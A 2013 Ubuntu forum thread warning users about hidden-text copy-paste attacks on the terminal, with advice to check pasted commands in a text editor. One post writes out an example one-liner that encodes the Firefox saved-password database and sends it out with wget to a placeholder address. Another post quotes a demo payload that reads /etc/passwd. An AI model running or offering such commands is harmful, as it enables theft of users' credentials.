---
title: "Warning to those who copy-paste commands directly to the Terminal"
date: 2013-04-07
forum: The Cafe
---

### Post by jerenept on 2013-04-07
Don't. [Seriously.]("http://thejh.net/misc/website-terminal-copy-paste") It's trivial to completely destroy your system this way. UbuntuForums should be safe, however, blogs and the like may not. Always paste into a text editor and make sure what you're going to run is safe before running.

---

### Post by CharlesA on 2013-04-07
Interesting use of span tags...

Oh yeah, don't forget sometimes things you find on blogs are old and sometimes don't work the way you think they do.

For example, I was trying to set up a mail server on my VPS and ran into a tutorial on how to do that without using MySQL, except some of the packages they said needed to be installed were no longer available, so apt-get threw an error.

---

### Post by Linuxratty on 2013-04-07
I don't. I only have people help me at Linux Internationals. If i were going to copy paste something i would always check with my betters at LI to make sure it's  safe.

---

### Post by samsom63 on 2013-04-07
Thanks for the advice!!

---

### Post by Rochambo on 2013-04-08
How Intriguing. 

How does this work, exactly?

---

### Post by wojox on 2013-04-08
> **CharlesA said:**
> Interesting use of span tags...

[COLOR="#00FF00"]*<!-- Oh noes, you found it! -->*[/COLOR] :lolflag:

---

### Post by CharlesA on 2013-04-08
> **wojox said:**
> [COLOR="#00FF00"]*<!-- Oh noes, you found it! -->*[/COLOR] :lolflag:

Indeed!. ;)

---

### Post by coldcritter64 on 2013-04-09
> **jerenept said:**
> Don't. [Seriously.]("http://thejh.net/misc/website-terminal-copy-paste") It's trivial to completely destroy your system this way. UbuntuForums should be safe, however, blogs and the like may not. Always paste into a text editor and make sure what you're going to run is safe before running.

I checked the git clone copy/pastes in a text editor before running in terminal; WOW, a real eyeopener to what could happen. Thanks for the tip, that just changed my installing habits from blogs etc in the future; I had no idea of that danger till now. Cheers.

---

### Post by forrestcupp on 2013-04-09
I remember several years ago when some people on here were posting commands to delete people's hard drive partitions. It doesn't have to be anything advanced at all. You just have to have someone new and trusting who doesn't know what they're doing, and you could do a lot of damage. 

We haven't had any of that kind of trouble here for a very long time. But like the OP said, you can't just trust every random blog out there. CharlesA also made a good point that a lot of stuff that comes up in searches on the net are old and don't work anymore.

---

### Post by wojox on 2013-04-09
> **forrestcupp said:**
> You just have to have someone new and trusting who doesn't know what they're doing, and you could do a lot of damage. 

or just plain lazy like me. :P

---

### Post by CharlesA on 2013-04-09
> **wojox said:**
> or just plain lazy like me. :P

Lazy like me too, except I'll run stuff on a test box before trying it on production. :p

---

### Post by codingman on 2013-04-09
> **forrestcupp said:**
> I remember several years ago when some people on here were posting commands to delete people's hard drive partitions. It doesn't have to be anything advanced at all. You just have to have someone new and trusting who doesn't know what they're doing, and you could do a lot of damage. 

We haven't had any of that kind of trouble here for a very long time. But like the OP said, you can't just trust every random blog out there. CharlesA also made a good point that a lot of stuff that comes up in searches on the net are old and don't work anymore.

100% agreed. If you don't have a text editor open, quote the person's post and review ALL of it, for anything fishy or suspicious.

---

### Post by CharlesA on 2013-04-09
> **codingman said:**
> 100% agreed. If you don't have a text editor open, quote the person's post and review ALL of it, for anything fishy or suspicious.

I doubt you'll find much like that on these forums (mostly cuz it's fairly hard to hide text with CSS like the link in the OP does), but if you want to be sure, you can always quote the post or copy/paste it into the quick reply box to see if there is anything iffy about it.

---

### Post by codingman on 2013-04-09
True, but its better to be safe than sorry.

---

### Post by Feathers McGraw on 2013-04-10
Haha thanks, guess I was being a bit naive there.

As for leading people to delete their hard drive partitions...that's just MEAN.

---

### Post by forrestcupp on 2013-04-10
> **wojox said:**
> or just plain lazy like me. :P

You don't even have to be lazy when it comes to the longer scripts. How many people actually sift through every line of a long script before they run it, even if they know what it means? Most people don't have that much time, so they just trust people.

---

### Post by pqwoerituytrueiwoq on 2013-04-10
note to self: stop using terminal for scrap paper (easy to open via keyboard shortcut), that trick could use curl to read my firefox password database and send it somewhere

eg have something like this hidden in it
```
data="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$(cat ~/.mozilla/firefox/*.default/signons.sqlite)")";wget "http://127.0.0.1?data=$data" -o /dev/null &;clear;bash ~/.bashrc 2> /dev/null
```
that makes your firefox password database URL safe and sends it to localhost (127.0.0.1) the loopback address on a computer, that address could easly be changed to some sever somewhere that processes the database
and if your passwords are not password protected (Edit -> Preferences -> Security -> look at the last check box) you would be screwed and not even know it

---

### Post by Moose on 2013-04-10
Thanks so much for the heads up! I don't usually c/p commands unless they are really big, but now I will stay more wary. ;)

---

### Post by JayKay3OOO on 2013-04-11
Always read the label.

---

### Post by Locus Kiesselbachi on 2013-04-12
WOW :shock:
didnt know that. 

git clone /dev/null; clear; echo -n "Hello ";whoami|tr -d '\n';echo -e '!\nThat was a bad idea. Don'"'"'t copy code from websites you don'"'"'t trust!
Here'"'"'s the first line of your /etc/passwd: ';head -n1 /etc/passwd
git clone git://git.kernel.org/pub/scm/utils/kup/kup.git

git clone [201~/dev/null; clear; echo -n "Hello ";whoami|tr -d '\n';echo -e '!\nThat was a bad idea. Don'"'"'t copy code from websites you don'"'"'t trust!
Here'"'"'s the first line of your /etc/passwd: ';head -n1 /etc/passwd
git clone git://git.kernel.org/pub/scm/utils/kup/kup.git


OK, thank you for advice!

edit:
added leafpad shortcut into taskbar-s "application launch bar"

edit2:
hmm you can select the code and right click on it - look for "search by google", but  dont select it. At least beginnig is seen - something is not what it looks like. :)

---

### Post by newbie2 on 2013-04-17
> Copying and pasting something does not necessarily mean the user will get what they think they are getting. With a little bit of HTML magic, one can even trick unwitting web site visitors into executing shell commands without their knowledge. The trick is by no means new, but it is currently being demonstrated again on several web sites which means Linux users especially have to be careful what they copy and paste.

In theory, the trick does work in Windows and Mac OS X as well, but on those platforms it is usually harder to get users to open a command line window and paste commands into it. For many Linux users, however, this behaviour is still a normal thing to do. Many how-to guides and documentation pages include commands such as sudo apt-get install packagename that users are expected to either duplicate manually or, the more likely approach, copy and paste into a command-line window. Most users will copy and paste such commands as that approach is more convenient to them.
[http://www.h-online.com/open/news/item/Old-tricks-are-new-again-Dangerous-copy-paste-1842898.html](http://www.h-online.com/open/news/item/Old-tricks-are-new-again-Dangerous-copy-paste-1842898.html)
:rolleyes:

---

### Post by coffeecat on 2013-04-17
Merged

---

### Post by SifGrey on 2013-04-22
Thanks for the warning. I've often found myself pasting commands into the terminal and thinking "this might actually do harm" only a nanosecond afterwards.

---

